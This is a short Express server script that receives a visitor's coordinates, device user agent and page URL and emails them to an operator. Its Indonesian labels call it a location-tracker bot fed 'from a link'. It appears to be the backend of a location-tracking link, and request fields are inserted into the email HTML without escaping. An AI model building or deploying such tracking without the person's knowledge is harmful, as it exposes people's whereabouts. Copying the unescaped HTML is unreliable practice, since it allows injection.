require('dotenv').config()
const express = require('express')
const bodyParser = require('body-parser')
const nodemailer = require('nodemailer')
const app = express()
const port = process.env.PORT || 3000

app.use(express.static('public'))
app.use(bodyParser.json())

const transporter = nodemailer.createTransport({
  host: process.env.SMTP_HOST,
  port: Number(process.env.SMTP_PORT || 587),
  secure: process.env.SMTP_SECURE === 'true',
  auth: {
    user: process.env.SMTP_USER,
    pass: process.env.SMTP_PASS
  }
})

const TO_EMAIL = process.env.TO_EMAIL

app.post('/api/send-location', async (req, res) => {
  try{
    const body = req.body
    if(!body || typeof body.latitude === 'undefined') return res.status(400).json({error:'payload invalid'})

    const subject = `📍 Laporan Lokasi dari Link`
    const html = `
      <p>Halo, berikut informasi lokasi yang dikirim pengguna:</p>
      <ul>
        <li><strong>Koordinat:</strong> ${body.latitude}, ${body.longitude}</li>
        <li><strong>Akurasi:</strong> ${body.accuracy} meter</li>
        <li><strong>Waktu:</strong> ${body.timestamp}</li>
        <li><strong>Google Maps:</strong> <a href="${body.mapsLink}" target="_blank">Lihat Lokasi</a></li>
        <li><strong>Perangkat:</strong> ${body.userAgent}</li>
        <li><strong>Halaman:</strong> <a href="${body.pageUrl}">${body.pageUrl}</a></li>
      </ul>
      <p>Terima kasih,</p>
      <p><em>Bot Pelacak Lokasi</em></p>`

    await transporter.sendMail({
      from: process.env.FROM_EMAIL || process.env.SMTP_USER,
      to: TO_EMAIL,
      subject,
      html
    })

    res.json({ok:true})
  }catch(err){
    console.error(err)
    res.status(500).json({error: err.message})
  }
})

app.listen(port, ()=> console.log('Server berjalan di port', port))